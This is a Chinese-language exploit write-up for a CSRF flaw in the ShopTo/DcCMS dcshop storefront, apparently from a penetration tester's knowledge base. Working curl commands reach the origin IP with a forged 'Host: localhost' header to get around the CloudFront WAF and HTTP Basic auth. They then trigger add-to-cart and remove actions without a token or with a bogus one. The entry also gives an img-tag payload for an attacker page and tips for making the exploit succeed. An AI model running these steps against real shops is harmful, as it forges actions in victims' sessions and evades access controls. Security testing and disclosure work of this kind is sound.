# ShopTo/DcCMS dcshop 店铺前端 CSRF：状态变更动作不校验 storefront_token 且可 GET 触发

## 结论一句话
dcshop 店铺前端把全部状态变更动作挂在通用处理器 `/en/<页面>/queue/?action=<动作名>` 上，
服务端**既不校验 storefront_token**（缺失/错误令牌同样生效）、**也不限制 HTTP 方法**（纯 GET 即可触发）。
配合浏览器 SameSite=Lax 对顶层导航放行 cookie 的规则，攻击者可让受害者在自身会话内被加购/改车（CWE-352）。

> 归类说明：本条目本质是 CSRF（缺服务端请求验证），知识库无 csrf 分类，就近归入 auth-bypass（反 CSRF 校验控制失效）。

## 适用面 / 前置
- 目标为 DcCMS 2015 / dcshop 系店铺前端（首页内联 `window.shopToActionProtection` 保护的动作白名单）。
- 源站直连可达：URL 用 `https://<源站IP>/`，请求头 `Host: localhost`（绕过 CloudFront WAF 与 dev 的 HTTP Basic）。
- curl 加 `-k`，必要时 `--http1.0`（部分路径 HTTP/1.1 会 empty reply）。
- 匿名会话即可，无需登录；cookie jar 保存服务端下发的 `sidb2c`。
- 源站下发的 token 为空串（dev/staging 环境特征）。

## 关键判据
1. 首页内联对象里 `token` 为空串：
   ```html
   window.shopToActionProtection = {"token":"","actions":["shop_login","shop_add_item_to_basket_card","shop_remove_item_from_basket_by_id", ...]}
   ```
2. 纯 GET、且不带 `storefront_token`，`/queue/?action=...` 返回 200 且购物车状态真的改变（阴性/阳性对照）。
3. 故意提供错误 `storefront_token` 仍然生效 → 服务端根本不校验。
（生产 www 首页 token 非空，别把生产站当同一结论。）

## 复现步骤（curl）

```bash
IP=<源站IP>; SLUG=0002153-erdinger-alkoholfrei-24-x-50-cl-shrink-wrapped-p51872

# 0) 看令牌是否为空
curl -sk --http1.0 -c cj.txt -b cj.txt -H 'Host: localhost' https://$IP/en/ | grep -o 'shopToActionProtection = {[^}]*}'

# 1) 阴性对照：购物车为空
curl -sk --http1.0 -c cj.txt -b cj.txt -H 'Host: localhost' https://$IP/en/basket/ \
  | grep js-order-price-total          # 期望 $0.00 (0)

# 2) 纯 GET、无令牌加购
curl -sk --http1.0 -c cj.txt -b cj.txt -H 'Host: localhost' \
  "https://$IP/en/$SLUG/queue/?action=shop_add_item_to_basket_card&item_id=51872&item_qty=1&item_var_code="
# 期望 HTTP/1.0 200

# 3) 阳性对照：购物车 +1
curl -sk --http1.0 -c cj.txt -b cj.txt -H 'Host: localhost' https://$IP/en/basket/ \
  | grep js-order-price-total          # 期望 £32.85 (1)，并出现 action=shop_remove_item_from_basket_by_id&action_id=<id>

# 4) 错误令牌仍生效（证明不校验）
curl -sk --http1.0 -c cj.txt -b cj.txt -H 'Host: localhost' \
  -X POST "https://$IP/en/$SLUG/queue/?action=shop_add_item_to_basket_card" \
  --data 'item_id=51872&item_qty=1&item_var_code=&action=shop_add_item_to_basket_card&storefront_token=deadbeef1234'
# 期望 200，购物车仍 +1

# 5) 移除动作同样可被纯 GET 触发
curl -sk --http1.0 -c cj.txt -b cj.txt -H 'Host: localhost' \
  "https://$IP/en/basket/?action=shop_remove_item_from_basket_by_id&action_id=4573"
# 期望 200，购物车回到 $0.00 (0)
```

## 利用形态（浏览器侧）
攻击者页面仅需：

```html
<img src="https://<门店域>/en/<商品slug>/queue/?action=shop_add_item_to_basket_card&item_id=<id>&item_qty=1&item_var_code=">
```

或让受害者顶层导航到该 URL（顶层导航对 SameSite=Lax 的 cookie 放行），即在其会话内完成加购/改车。

## 失败常见原因
- 打的是**生产 www**：token 非空，服务端可能真校验 → 先确认 token 是否为空串。
- 走了 **CloudFront 边缘**：伪造 Host 会被 403 拦下，必须直连源站 IP。
- 未加 `--http1.0`：部分路径 empty reply。
- **cookie jar 未复用**：会话串扰会让阴阳对照失真，验证时用独立 cookie jar。